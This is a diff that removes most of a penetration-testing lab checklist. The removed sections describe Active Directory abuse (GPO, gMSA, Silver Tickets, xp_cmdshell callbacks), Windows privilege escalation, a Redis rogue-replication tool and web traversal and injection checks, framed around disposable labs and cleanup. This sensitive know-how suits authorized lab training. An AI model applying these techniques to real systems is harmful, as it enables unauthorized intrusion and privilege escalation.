-Quota and exact control precede mutation. The empty baseline makes removal
-auditable without replacing another delegate's state. Computer creation,
-delegation, ticket, shell and two cleanup reads are different facts. The former
-echo/`ls` checks and duplicate native identity commands are omitted; `klist`
-and WIN-01 answer those questions. An existing RBCD baseline needs a separate
-reviewed procedure rather than this shortcut.
-
-## AD-17 Read a gMSA secret only when granted
-
-NetExec --gmsa queries msDS-ManagedPassword and converts readable material to an NT hash. It can return more than one readable gMSA, so select only the account and host justified by the current graph. GMSA_ACCOUNT is the sAMAccountName without its trailing dollar sign; the displayed authentication commands add it. Treat the hash as a secret and do not paste it into the reusable document. A readable password does not imply WinRM access, administrative rights or domain compromise. If LDAP returns an operations error, confirm the controller hostname, LDAP transport and current NetExec version before changing credentials. Return a successful shell to WIN-01 and evaluate its token independently through AD-12.
-
-Group-mediated read rights need the complete membership chain. CN/display
-name is not a substitute for the exact managed `sAMAccountName`. A readable
-hash is a candidate until one assigned service authenticates it.
-
-## AD-18 Use exact GPO control on its affected host
-
-GPO control is broad: determine the GPO identity, link and affected computers before modifying it. GPO_NAME is the exact display name returned by Get-GPO. GPO_BACKUP_DIR is a new writable directory used only for this lab backup. SHARPGPOABUSE_PATH is a reviewed executable whose hash and source are recorded. --AddLocalAdmin changes the policy; tool success is not host access until gpupdate applies and membership changes on the intended target. Do not use a startup script, immediate task, hidden command, blanket domain target or unverified Default Domain Policy. Restore-GPO replaces the GPO with the saved state and may require additional rights; run it only after the objective, then run gpupdate again on the affected host and confirm the added membership is gone. If restoration fails, preserve the error and reset the disposable lab. Never use this branch against a production-like domain without an explicit change and recovery plan.
-
-A GPO backup is required before the edit but does not itself restore policy.
-The affected host can lag. Confirm the actual local group after policy refresh
-both before access and after restoration. If they still differ, use the
-preselected lab reset/revert.
-
-## WIN-09 Use SeRestorePrivilege with an immediate restore plan
-
-The reviewed PSBits EnableSeRestorePrivilege script enables SeRestorePrivilege in the current PowerShell process; error 1300 means the privilege is not held. This task replaces a protected Windows accessibility binary and is intentionally limited to a disposable assigned lab. Confirm that RDP is already exposed; do not enable it. Keep the original low-privilege shell open for restoration. The first Copy-Item is the recovery gate: if the backup is absent or empty, stop. After replacement, connect only to the assigned host and trigger Utility Manager with Windows+U at the sign-in screen. The new command window is separate from the original shell. After evidence, restore from the exact backup in the original privileged PowerShell process, remove only the backup created here, and verify the original file exists. If cleanup fails, preserve the error and reset the lab.
-
-The maintained source's forced backup and `/cert:ignore` examples are not the
-selected working commands. Heist denied a System32 backup and overwrite, then
-showed a matching user-writable copy, successful protected-file renames and a
-SYSTEM token after the sign-in trigger. It did not show restoration. The
-selected step therefore keeps a no-overwrite recovery copy, helper-success
-gate, explicit intermediate file states and a separate restore-and-behavior
-gate. Never report `system_token_original_restored` from the walkthrough alone.
-
-## WIN-10 Start a process with one known plaintext credential
-
-RunasCs creates a process with the supplied credential and can return its standard streams over the explicit remote channel. It does not bypass UAC or guarantee a more privileged token. Use the domain form only for a validated domain account and the local form only for a validated account on this host. Start the listener in a separate Kali terminal and keep the current shell open. Logon-right restrictions, endpoint controls and network reachability can block the new process even when the password is valid. Passwords on command lines can enter history and process listings; use a protected lab terminal. Remove the reviewed binary when cleanup is required.
-
-## WIN-11 Use SeManageVolume only on a disposable lab host
-
-SeManageVolumePrivilege permits high-impact volume maintenance. The reviewed helper used by this lab pattern grants broad write access on C:\; this can alter protected files and create denial-of-service risk, so this branch is restricted to an assigned disposable lab. Record whether tzres.dll existed before changing it. BACKUP_PATH must be new and is used only when an original existed. Generate and serve the DLL outside the repository, stop the temporary HTTP server after transfer, and start the callback listener before systeminfo loads the WMI localization DLL. The callback may be a service identity rather than SYSTEM; trust whoami /all, not the trigger. Restore the original DLL or remove only the introduced DLL, remove the staging copy, retain errors, and reset the lab to reverse the global ACL change.
-
-This high-impact helper affects broad `C:\` permissions. The retained source
-showed a forced backup copy that could overwrite an existing recovery file;
-the selected body refuses it. If the target DLL was initially absent, there
-is no original to restore, only an introduced file to remove. When it existed,
-its separately recorded hash is the byte-restoration check. ACLs, ownership
-and any other helper effects still require the tested disposable-host reset.
-The staging request uses a fresh private directory without a competing writer;
-the existence precheck is not an atomic no-clobber transfer. Do not stage into
-a shared directory. A partial file is never executable. No native privileged
-helper, payload or Windows DLL was run while authoring this checklist.
-
-## AD-19 Use one verified AD object-control edge
-
-The BloodHound edge must name the owned source principal, destination object and exact right. Group membership is the preferred reversible path when WriteMembers or equivalent control is verified: read membership before and after, add only the current controlled identity, and remove that exact membership after the objective. Force-changing a password disrupts the target account and cannot be restored without its old secret; use it only on an assigned disposable lab when the exact user-control edge requires it. Do not reset protected or broad-impact accounts by guess, do not add a new user, and do not treat tool success as access until the one-host validation succeeds. Preserve cleanup errors and reset the lab when state cannot be restored.
-
-A group addition can be removed and compared with the original membership.
-A password reset cannot be undone without the original secret. Use the
-preselected disposable-lab reset/revert after the check.
-
-## WIN-12 Forward one confirmed loopback service
-
-The reverse Chisel server accepts a client from the assigned Windows host and creates a listener only on Kali loopback. REMOTE_PORT is the evidenced Windows-local service; LOCAL_PORT is an unused Kali loopback port. Start the server in one Kali terminal, run the reviewed client in the existing Windows shell, and verify only the one forwarded port. A successful tunnel does not authenticate to or identify the application. Keep both processes visible, stop both after the service check, and remove the client when cleanup is required. Do not bind the forwarded service to 0.0.0.0, forward a range or treat another interface as automatically in scope.
-
-The Windows listener query establishes only that one process is listening on
-one loopback port. The reverse tunnel changes where Kali can connect; it does
-not identify the protocol, authenticate a user or authorize another interface.
-The supplement therefore binds a single forwarded port to Kali loopback, keeps
-both foreground processes visible, and requires exact cleanup before returning
-to the host workflow.
-
-## AD-20 Use a scoped MSSQL Silver Ticket
-
-This is a service-specific Silver Ticket, not domain compromise. The recovered password or NT hash must belong to the account behind the exact MSSQLSvc SPN; TARGET_USER is the existing client identity placed in the ticket. Use the port-bearing SPN observed during AD-07, correct hostname resolution and synchronized time. Run only one ticketer alternative; it writes TARGET_USER.ccache, which must be the CCACHE_FILE exported and inspected. The tunnel from WIN-12 carries the TCP session while Kerberos still uses TARGET_HOST for the service name. Record xp_cmdshell's initial value before changing it. Enable it only when disabled, run a benign whoami first, start the callback listener before the netcat command, and disable it afterward only if this task enabled it. Delete the ccache and transferred binaries when cleanup is required; preserve errors rather than minting broader tickets.
-
-The earlier maintained procedure includes `xp_cmdshell` enablement and a
-callback. That is not part of the selected ticket-login question. **DB-04**
-separates SQL identity, role and configuration; **DB-05** has its own bounded
-OS-identity check and original-state recovery. Neither procedure makes a SQL
-login into a Windows shell automatically.
-
-## REDIS-01. Response and authentication are different facts
-
-`PING` checks one endpoint's response. `PONG` does not establish OS access.
-Authentication failure, command authorization denial and connection failure are
-different results. Use only supplied, permitted credentials, not candidate lists.
-`--askpass` avoids embedding passwords in process arguments and shell history.
-An ACL username applies only when the supplied context actually includes one.
-See the [official Redis CLI guide](https://redis.io/docs/latest/develop/tools/cli/).
-
-If the assignment specifies TLS, use its supplied CA/server-name connection
-settings instead of treating a plain connection error as absence of Redis. Do not
-bypass certificate verification or repeat the same failed request without a
-changed fact. Missing local tools belong in local setup, not target mutation.
-
-## REDIS-02. Runtime metadata is not filesystem capability
-
-`INFO server` and exact `CONFIG GET` reads describe this instance and identity's
-visibility. An on-disk configuration can differ from effective runtime state.
-Do not fetch every configuration field or database value to answer a version or
-path question. These steps do not use SET, SAVE, CONFIG SET, replication, modules
-or scripts. An earlier write failure cannot be explained by a successful
-configuration read alone; retain it as unresolved unless actual diagnostics
-establish a cause.
-
-If an independently verified host shell encounters `Read-only file system`,
-use **LNX-04**'s conditional mount notes in that same process context. Unix modes,
-ACLs, mount options and service isolation are distinct. Do not change service
-confinement merely to make a permission check succeed.
-
-## REDIS-03. Capability checks precede state changes
-
-`COMMAND INFO` answers whether the live server exposes one command required by
-the reviewed candidate. `MODULE LIST` and `INFO replication` establish the
-current state. None proves that a module can load, replication can complete or
-the service account can write the candidate path. Keep any mutation and its
-recovery inside the selected **REXP** or **EXP-02** attempt.
-
-Optional Kali preparation, when internet access and the exercise rules permit
-using this third-party project:
-
-```bash
-git clone https://github.com/Dliv3/redis-rogue-server.git
-cd redis-rogue-server
-ls -l
-file exp.so
-```
-
-This is a possible tool source, not a required step or a trust decision. The
-upstream default branch can change. Before relying on the local copy, record the
-exact revision and artifact hash, then review the script and module source:
-
-```bash
-git rev-parse HEAD
-git status --short
-sha256sum exp.so redis-rogue-server.py
-```
-
-Keep the reviewed local copy available before an offline session. Do not infer
-that `exp.so` matches the target architecture or Redis build from its filename;
-`file exp.so` answers only the local artifact-format question.
-
-## REDIS-04. Command output, a socket and a shell are different results
-
-An added Redis command may return OS output without giving terminal control.
-`id` establishes the process identity and `hostname` helps correlate the host.
-Only an independently observed, usable session enters **EXP-03**. Once verified,
-the ordinary Linux checklist owns namespace, filesystem, scheduler and
-privilege decisions; Redis does not bypass those prerequisites.
-
-## REXP-01. Rogue replication is destructive state, not a generic Redis check
-
-`REPLICAOF` changes replication at runtime. A full synchronization can replace
-the target dataset, and `REPLICAOF NO ONE` does not recreate discarded data.
-That is why this branch requires an initial master role and a disposable reset
-route. Redis documents `REPLICAOF` as an administrative, dangerous command.
-See [REPLICAOF](https://redis.io/docs/latest/commands/replicaof/) and
-[Redis replication](https://redis.io/docs/latest/operate/oss_and_stack/management/replication/).
-
-## REXP-02. The reviewed tool owns several state changes
-
-The upstream script changes replication, reads and changes `dbfilename`, serves
-`exp.so`, loads the module and opens a `system.exec` loop. Its `exit` path tries
-to restore the filename, remove the module file and unload the module. It does
-not restore a replaced dataset. The source accepts `--passwd`, despite its README
-describing a different password flag. Always confirm the local `--help` output
-for the recorded revision. See the
-[upstream repository](https://github.com/Dliv3/redis-rogue-server) and
-[script source](https://github.com/Dliv3/redis-rogue-server/blob/master/redis-rogue-server.py).
-
-## REXP-03. Post-state decides whether the attempt is finished
-
-Module output and Redis state are independent. The process can fail after the
-module loads, or exit before cleanup. Compare the live module list, role and
-filename to the recorded baseline. Redis identifies runtime-loaded modules by
-their registered name, which is why `MODULE LIST` must precede `MODULE UNLOAD`.
-See the [Redis modules guide](https://redis.io/docs/latest/develop/reference/modules/).
-
-## REXP-04. An RDB include needs both parsers to cooperate
-
-`SAVE` writes an RDB database, not a raw PHP file. The pivot applies only when
-the generated RDB retains the PHP tag and the verified application passes that
-same file to PHP `include` or `require`. A file-read response alone is
-insufficient. The identity marker proves the web worker that interpreted the
-embedded PHP; it does not prove an interactive shell until the separate channel
-is received and attributed.
-
-This module covers two Readys-specific paths. Unauthenticated Redis write paths,
-authorized-key writes, cron-file writes, Lua behavior, SSRF-only Redis, Windows,
-clusters, containers, Redis 6+ ACL-specific routes and unrelated CVEs remain
-separate findings or coverage gaps. No finite checklist can guarantee completion
-of every Redis box.
-
-## SSH-03. Sequence processing and closure limits
-
-The daemon observes packet sequences and runs the configured action. Its
-sequence ports need not themselves be open. `%IP%` is the client's address as
-seen by the daemon, so changing VPN, NAT route or client can make the closing
-event remove a different rule. This procedure does not guarantee connectivity
-or transactional rule changes. The daemon may not be running or listening on
-the relevant interface, and a readable configuration can be stale.
-
-`knock -v` prints intended hits, not server acknowledgements. The maintained
-client ignores individual connect/send errors and can exit zero without a
-completed action. Nmap observes a new TCP connection, not authenticated SSH or
-the exact firewall delta. Established SSH sessions can survive rule removal;
-exit owned sessions and test a new connection. A lost response cannot justify
-an unbounded retry that might add duplicate rules.
-
-The DC-9 source shows an observed opening sequence, changed SSH reachability
-and subsequent authentication. It does not demonstrate the closing event or
-firewall restoration. Closing/recovery requirements here are authored additions,
-not claims that the walkthrough validated them.
-
-Primary references: [maintainer's knock client manual](https://github.com/jvinet/knock/blob/master/doc/knock.1.in),
-[daemon event configuration](https://github.com/jvinet/knock/blob/master/doc/knockd.1.in)
-and [client connect/send handling](https://github.com/jvinet/knock/blob/master/src/knock.c).
-Check installed client help and the observed daemon configuration; the app does
-not fetch these references at runtime or execute this procedure for you.
-
-## WPRIV-01. Installer state and callback identity are different results
-
-Microsoft documents elevation when both policy values are 1. The current
-user's HKCU matters; another user's policy result does not establish this gate.
-The [policy documentation](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
-supports this prerequisite, not an outcome for a particular package.
-
-The [msiexec reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec)
-defines normal install, quiet mode, logging and no-restart options. Quiet mode
-is used to avoid a modal installer in a remote shell, not to hide a claimed
-success. Start-Process waits for the installer, not necessarily every payload
-child. The caller's PowerShell identity is not the callback's token.
-
-Rapid7's [msfvenom guide](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
-describes payload/format generation. Its
-[MSI format dispatcher](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/util/exe.rb)
-selects a Windows executable wrapper. The
-[AlwaysInstallElevated module source](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always_install_elevated.rb)
-describes an embedded executable and intentionally failed installation after
-execution to avoid product registration. Therefore an installer error can coexist
-with a callback. Inspect your installed template/version; do not assume all
-packages have identical failure or cleanup behavior. No evasion, encoder,
-account creation, persistent service or Meterpreter handler is required here.
-
-The [Ncat guide](https://nmap.org/ncat/guide/ncat-usage.html) documents the explicit
-listen address and default single-connection behavior. The callback is plain TCP,
-without authentication or encryption. Verify its source, assigned host and token
-through the existing adventure context. A blocked route remains a route gap,
-not a reason to bind every interface or select an unrelated endpoint.
-
-Installer logs, extracted executables, rollback and caches can make exact recovery
-package-specific. This procedure requires a disposable-lab reset/revert rather
-than pretending deletion of proof.msi restores the whole host. Preserve objective
-evidence before that reset, and retain an unresolved recovery state if it fails.
-
-## DNS-01 — Why preserve the full DNS response?
-
-The query has four separate identities: resolver, name, record type and answer.
-An A result is an IPv4 observation; an empty A answer does not settle AAAA. A DNS
-negative response differs from transport silence. `dig` can finish successfully
-while the DNS response is negative, so retain its status and sections. The examples
-select a resolver/port and limit query time/tries; TCP can distinguish a UDP-only
-failure. Truncated UDP normally triggers TCP fallback already. See the
-[BIND dig manual](https://bind9.readthedocs.io/en/latest/manpages.html#dig-dns-lookup-utility).
-
-Do not use `+trace` here: it can contact other resolvers. Zone transfers, bulk
-name discovery, SRV enumeration and DNS updates are **not covered by these six
-decisions**. A need for them remains a named content gap, not a completed DNS branch.
-
-## DNS-02 — Why use a hostname without editing `/etc/hosts`?
-
-`--resolve` sends this request to the selected address while retaining the URL
-hostname for HTTP and HTTPS. It is temporary to the curl invocation. The example
-does not follow redirects or bypass certificate checks; `--noproxy` avoids silently
-using an environment proxy; first-position `-q` skips the default curl config.
-It tests one origin, not every name sharing the IP.
-See the [curl manual](https://curl.se/docs/manpage.html#--resolve) for address
-pinning and [its CA option](https://curl.se/docs/manpage.html#--cacert) for the
-selected verified HTTPS retry.
-
-For IPv6, curl's resolve-address field needs brackets; this working block is the
-IPv4 case. For non-root application paths, replace the final `/` with the already
-observed path and retain it in the application base. No persistent hosts-file edit
-means no hosts-file restoration step. Names learned from PTR, certificates or web
-responses remain clues until their scope and intended endpoint are checked.
-
-## DNS-03 — Why an AXFR result is bounded evidence
-
-SOA records establish the assigned zone; they do not authorize
-every name returned by a transfer. AXFR is included only for an explicitly
-assigned zone/server and is bounded by a timeout. Refusal is a useful negative
-observation, while a partial transfer must retain its serial and extent. This
-branch intentionally avoids wordlists, wildcard sweeps and updates.
-
-If the SOA reply leaves a specific name-server question, query NS separately:
-
-```bash
-dig '@<authorized-authoritative-server>' -p '<observed-authoritative-dns-port>' -q '<assigned-zone-with-trailing-dot>' NS +noall +answer +authority +comments
-```
-
-## NFS-01 — Why can `showmount` fail while NFS exists?
-
-It contacts MOUNT; a v4-only server need not expose that service. Export visibility
-also does not establish client read access. See the upstream
-[showmount manual](https://man7.org/linux/man-pages/man8/showmount.8.html).
-
-The [rpcinfo manual](https://manpages.debian.org/testing/rpcbind/rpcinfo.8.en.html)
-documents `-p` program/version discovery through portmapper.
-`timeout` bounds these userspace discovery commands. Exit 124 means the wrapper
-timed out, not that the protocol is absent. Do not assume a nonstandard RPC endpoint
-uses the standard discovery ports. No reviewed local NFS case validates these
-instructions yet; reuse the existing coverage register rather than rereading labs.
-
-## NFS-02 — What do mount success and cleanup prove?
-
-The procedure limits inspection to read-only access and makes no write or elevated
-identity claim. Numeric ownership is a clue; server-side identity mapping still
-matters. Reads run as your ordinary user, not via `sudo`. Do not execute remote
-files, source scripts, follow symlinks or recursively copy the export.
-
-`fg,retry=0` avoids background retries and stops after the first mount failure;
-it is **not a short hard deadline**. Default hard-mount I/O can still stall if the
-server disappears. Do not replace it with `soft` as a universal fix. See the
-[NFS mount-options manual](https://man7.org/linux/man-pages/man5/nfs.5.html) and
-[mount.nfs manual](https://man7.org/linux/man-pages/man8/mount.nfs.8.html).
-
-For busy cleanup, close any shell/file viewer inside this mount and retry ordinary
-`umount`. For a lost server, restore the authorized lab/VPN connection first. If
-that fails, preserve the exact mountpoint and seek recovery guidance; forced/lazy
-unmount or a disposable-VM reset needs an explicit choice, not an automatic fallback.
-`rmdir` removes only the empty temporary local mountpoint after unmounting, never
-export contents. The guarded block also refuses a symlink, unexpected source or
-non-NFS mount. It cannot make a concurrent remount race impossible, so do not
-share the mountpoint with another process. The util-linux
-[findmnt](https://man7.org/linux/man-pages/man8/findmnt.8.html) and
-[mountpoint](https://man7.org/linux/man-pages/man1/mountpoint.1.html) manuals
-document the exact-mountpoint and source checks. NFS-03 covers one explicitly authorized inert write/remove probe;
-root-context mapping, deep file triage and Kerberos setup remain separate
-unimplemented decisions.
-
-### Master handoffs and provenance
-
-`NET-03`, `NET-05`, `WEB-01` and `AD-01` are existing master decisions;
-`PAUSE-ROUTE`, `PAUSE-RECOVERY` and `GAP-SERVICE` are existing terminal states.
-Record the observed result and handoff manually: these Markdown decisions do not
-yet drive Quest or terminal recording. Both modules stand alone for their
-stated questions and return a concrete result or recovery state; neither claims
-complete DNS/NFS coverage.
-
-Source observations: [DNS-001 and DATA-001](checklist.md), with prior review limits
-in [lab-retrospective.md](lab-retrospective.md). Existing naming observations are
-partial retrospective context, not validation of these commands. No target was
-contacted while authoring this revision.
-
-## NFS-03 — Why an inert write does not establish root-squash behavior
-
-The probe tests one authorized write/read/remove cycle and records the server's
-reported owner/group. It deliberately uses a new filename and restores the
-export before exit. A normal user can be mapped to an unexpected numeric ID, and
-a successful ordinary-user write says nothing about what an NFS root client
-would receive. Root-squash conclusions require a separately authorized test
-context and must not be inferred from this branch.
+An inert write and delete prove the export is writable.
 
 ## SNMP-01. Why scan one UDP port and guess communities?
 
@@ -10064,752 +4536,173 @@ process, and a version string is not proof that an advisory applies. Walking onc
 into a file and grepping beats repeated targeted walks, and it preserves the
 partial output when an agent stalls.
 
-## DB-01. Why separate transport, trust, account and database?
-
-These failures answer different questions. A TLS failure occurs before ordinary
-credential interpretation; successful authentication need not grant the selected
-database. PostgreSQL `hostaddr` selects the connection address while `host` still
-supplies the name for certificate verification. The TLS example forces `verify-full`,
-a password prompt and a connection timeout; `-X` excludes startup commands.
-See [psql options](https://www.postgresql.org/docs/current/app-psql.html)
-and [libpq connection parameters](https://www.postgresql.org/docs/current/libpq-connect.html).
-
-The MariaDB TLS example selects TCP, suppresses normal option-file loading and requests
-certificate validation with the assigned CA. It does not assume the installed
-`mysql` command supports MariaDB flags. Defaults and flags vary by client/version.
-See the [MariaDB client manual](https://mariadb.com/docs/server/clients-and-utilities/mariadb-client/mariadb-command-line-client).
-
-The separate non-TLS commands select PostgreSQL `sslmode=disable` or MariaDB
-`--disable-ssl` explicitly. They do not negotiate a plaintext fallback after a
-failed TLS connection. Confirm these options in the installed client's help.
-Missing CA material alone does not establish that an endpoint is non-TLS.
-See [PostgreSQL transport modes](https://www.postgresql.org/docs/current/libpq-ssl.html)
-and the MariaDB client manual above. Native connection behavior still needs a
-live trial; the offline fixtures only check the authored argument choices.
-
-Use password prompts rather than command-line passwords or `PGPASSWORD`.
-PostgreSQL startup/authentication can use lab-assigned service/user definitions;
-inspect them before use, not as a fallback that silently changes identity. These
-blocks need supplied trust and access context, not fabricated credentials. Do not
-save output containing secrets in the shared checklist or project log.
-
-## DB-02. Why metadata before table dumps?
-
-First establish the role, selected database and connected endpoint. Metadata can
-identify relevant application structure without reading every row. PostgreSQL's
-information schema and MariaDB's grants/listing apply to the current user's
-visibility; absence in a filtered view is not global absence. The bounds in the
-PostgreSQL examples deliberately leave larger results incomplete.
-See [PostgreSQL identity functions](https://www.postgresql.org/docs/current/functions-info.html),
-[visible table metadata](https://www.postgresql.org/docs/current/infoschema-tables.html),
-[MariaDB SHOW GRANTS](https://mariadb.com/docs/server/reference/sql-statements/administrative-sql-statements/show/show-grants)
-and [SHOW COLUMNS](https://mariadb.com/docs/server/reference/sql-statements/administrative-sql-statements/show/show-columns).
-
-The PostgreSQL schema filter is a SQL string literal. Replace its value directly
-at the psql prompt; do not send PostgreSQL syntax to MariaDB. `USER()` and `CURRENT_USER()`
-can identify different MariaDB connection/authentication contexts. Neither a broad
-grant nor database ownership proves a verified operating-system shell.
-
-DB-07 supplies one fixed server-program proof, not an interactive OS session.
-DB-08 supplies one bounded exact-path server-file read. Sensitive-row reading,
-database write tests and other
-privilege transitions remain exact capability gaps
-instead of calling three engines comprehensive database coverage. Source question:
-`DATA-003` in [checklist.md](checklist.md); the indexed
-[retrospective](lab-retrospective.md) supplies partial database context and a TLS
-failure-stage observation, not a prospective test of these commands.
-
-## DB-06. Why Oracle identity and metadata stay read-only
-
-Oracle service names, listener endpoints, TLS/wallet trust and database identity
-are separate facts. `SYS_CONTEXT` and bounded dictionary views establish the
-current session without implying access to the host running Oracle. This route
-deliberately excludes external-file packages, scheduler jobs and OS-command
-surfaces; a role or object listing is a lead for a separately reviewed question,
-not permission to change database or host state.
-
-## DB-07. SQL privileges and OS identity are separate
-
-`COPY FROM PROGRAM` executes on the database server as its OS service account,
-not on Kali and not as the SQL role's similarly named account. The program string
-is interpreted by a shell; this example deliberately uses only a fixed identity
-command. Database-owner or table SELECT rights alone are not program rights.
-See [PostgreSQL COPY](https://www.postgresql.org/docs/18/sql-copy.html)
-and [predefined roles](https://www.postgresql.org/docs/18/predefined-roles.html).
-
-The temporary table exists only in this session. Creating it inside the new
-transaction and rolling back removes that object; ON COMMIT DROP also avoids
-retaining it if the operator mistakenly commits. None of this reverses external
-OS effects of another program. Use a dedicated connection so rollback cannot
-discard unrelated operator work. See [temporary tables](https://www.postgresql.org/docs/18/sql-createtable.html)
-and [ROLLBACK](https://www.postgresql.org/docs/18/sql-rollback.html).
-
-The 10-second statement timeout bounds this selected query, not every possible
-child process or server recovery. Retain denied/missing/uncertain outcomes.
-No native PostgreSQL client is available on the authoring host; source/route
-checks do not validate actual COPY, role inheritance or cleanup. Server-file
-write access, interactive PostgreSQL footholds and other engines remain separate gaps.
-
-## DB-08. Missing, empty, denied and partial are different observations
-
-This is a server-side read under the database process's OS permissions, not a
-Kali file read. `missing_ok = true` returns NULL for a missing file; other errors
-still fail. Length bounds the returned bytes, not the complete file size. The
-materialized sample reads once and keeps missing/length/content from that sample.
-Hex output avoids text-encoding errors and terminal control interpretation before
-explicit local decoding. See [PostgreSQL file functions](https://www.postgresql.org/docs/18/functions-admin.html#FUNCTIONS-ADMIN-GENFILE).
-
-The role/path boundary and function EXECUTE privilege are distinct. A narrow
-function grant or cluster-relative read without the shown role is a different
-context, not automatically absence of all file access. This selected procedure
-does not change grants, read arbitrary authentication tables or sweep paths.
-PostgreSQL 12+ is required for this MATERIALIZED CTE spelling. Native rights,
-file-access and SQL syntax still require a live authorized trial; no psql is
-available on the authoring host.
-
-## DB-03. SQL client variants and trust are independent prerequisites
-
-The official [sqlcmd manual](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver17)
-distinguishes ODBC and Go clients and version-dependent encryption flags. This
-example deliberately requires the ODBC variant supporting mandatory encryption.
-Prompting excludes a password argument; `-X1` suppresses startup/environment
-behavior and unsafe local commands. Trust material must already be assigned and
-installed through an approved local process. Source review does not prove this
-client/driver is available on Kali or that a lab server can satisfy TLS validation.
-
-## DB-04. SQL rights are not OS or domain privileges
-
-Original login, impersonated current login and database user can differ. Rights
-and metadata are evaluated in the current context; visible database/table/token
-lists have their own extent. [Effective permissions](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/determining-effective-database-engine-permissions?view=sql-server-ver17)
-and [HAS_PERMS_BY_NAME](https://learn.microsoft.com/en-us/sql/t-sql/functions/has-perms-by-name-transact-sql?view=sql-server-ver17)
-explain why a missing row or NULL must not be read as global denial. Switching to
-master and having permission to execute an object still do not establish that its
-OS process can start. AD-20's ticket and connection context stay separate.
-
-## DB-05. Service execution and restoration have separate evidence
-
-[xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17)
-uses the SQL Server service context for sysadmin execution, or an existing proxy
-for a permitted non-sysadmin. The resulting Windows account may have useful local
-rights, but SQL sysadmin is not itself host SYSTEM or domain administrator.
-The setting is server-wide, not a session option. Disconnecting does not undo it.
-Capture original states before any change; apply no unrelated pending settings.
-Native proof does not create an interactive shell. Live SQL/client, privilege,
-error and restoration behavior remain unvalidated by this authoring draft.
-
-## MAIL-01. Why inspect capabilities before mailbox access?
-
-SMTP transport is not mailbox access. Implicit TLS and STARTTLS need different
-client handshakes. The examples retain SNI and certificate hostname verification,
-with an assigned CA and failure-on-verification-error. `s_client` is a diagnostic
-client, not evidence that any advertised authentication or relay operation works.
-See [OpenSSL s_client](https://docs.openssl.org/master/man1/openssl-s_client/).
-
-This branch does not send messages, test relay permission or enumerate accounts.
-Plaintext-only mail and engine-specific mail vulnerabilities remain unimplemented
-practical decisions. POP3 reading is covered by MAIL-03; do not improvise beyond
-its bounded single-message route.
-
-## MAIL-02. Why UID, read-only selection and BODY.PEEK?
-
-UIDs avoid confusing moving message sequence numbers within this selected mailbox.
-Read-only selection and PEEK request data without intentionally setting Seen flags
-or expunging/deleting messages. The script logs out even after errors. It reads
-only one message's selected headers and an optional bounded text prefix. It does
-not decode MIME attachments or prove that later message bytes are irrelevant.
-See [Python imaplib](https://docs.python.org/3/library/imaplib.html).
-
-UIDs belong to the selected mailbox's UIDVALIDITY context, not global permanent
-IDs. Record folder and connection time with them; a resumed investigation must
-recheck mailbox context. Private terminal review can expose returned message
-content, so keep it inside the adventure's local evidence custody.
-
-## MAIL-03. POP3 retrieval without deletion
-
-POP3 has no IMAP-style folder/UID workflow in this module, so the procedure
-limits itself to the server's numbered listing and one `RETR`. It never sends
-`DELE`, records the exact message number and displayed extent, and treats a
-successful login without message bytes as incomplete mailbox access.
-
-## RDP-01. Why a graphical client rather than an SSH-terminal trick?
-
-FreeRDP needs a working graphical client session. The desktop mirror can give you
-a native Kali terminal from which to launch it; the SSH-backed shell alone does
-not imply display credentials. Match options to installed FreeRDP version and
-never quietly weaken certificate policy. Session-count limits and another user's
-active desktop can make an otherwise valid account unsuitable for login.
-See [FreeRDP client options](https://manpages.debian.org/testing/freerdp3-x11/xfreerdp3.1.en.html).
-
-## RDP-02. Why separate desktop attribution from token triage?
-
-Successful RDP authentication does not establish an elevated process, administrator
-rights or objective proof. `hostname`, `whoami` and `ipconfig` correlate the
-desktop with the assigned connection and account; `whoami` without `/all` does
-not show the full access token. WIN-01 performs that token/build/group triage in
-the same PowerShell session. A known NAT or backend mapping can explain a
-different address, but the operator must verify it rather than accept a mismatch
-silently. Disconnect and sign-out have different server-side effects.
-See Microsoft's [whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami),
-[hostname](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname)
-and [ipconfig](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig)
-references.
-
-Source questions: `MAIL-001` and `SSH-001` in [checklist.md](checklist.md), and
-WIN-01 in [Windows/AD](windows-ad-practical.json). Existing local-mail observations
-are not validation of remote IMAP commands. No private lab notes were reread and
-no target contacted while authoring this module.
-
-## WREAD-01. Requested path and returned file are different evidence
-
-Directory traversal depends on the server's OS, filesystem permissions, path
-construction and decoding. The four parent steps are a starting hypothesis, not
-a guarantee about directory depth. Curl percent-encodes a raw field value
-once; manually pre-encoding it would change the test. Compare structured content
-with a missing-file control. `/etc/passwd` normally describes accounts and is not
-the shadow password-hash file. A read may occur in a container namespace.
-
-Source basis: [OWASP directory traversal testing](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include/)
-and [PortSwigger path traversal](https://portswigger.net/web-security/file-path-traversal).
-Encoding bypasses, source disclosure, inclusion-to-execution and exact follow-up
-file questions remain further authoring work, not implied by this decision.
-
-## WEXEC-01. Demonstrate execution without confusing reflection or a shell
-
-The marker's pieces are separated in the request. An assembled output is stronger
-than seeing the raw input repeated, but could still be produced by application
-normalization. An independent native identity result in the same output context
-strengthens attribution. A semicolon works only where an actual POSIX shell treats
-it as syntax; subprocess argument arrays or quoting can prevent that. Neither
-the marker nor `id` creates a persistent shell. A web-server UID is not Kali's UID.
-
-Source basis: [OWASP command injection testing](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/)
-and [PortSwigger command injection](https://portswigger.net/web-security/os-command-injection).
-WEXEC-02/03 provide distinct quoted POSIX and cmd GET/form procedures. Output-blind,
-stored/other carriers and foothold delivery still need concrete procedures.
-Do not substitute random separator lists.
-
-## WSQL-01. One paired condition is a lead, not database-wide capability
-
-Numeric AND conditions preserve the original identifier instead of widening to
-all rows. The template still assumes a compatible query context; validation,
-parentheses, quoting, caching or application parsing can change its interpretation.
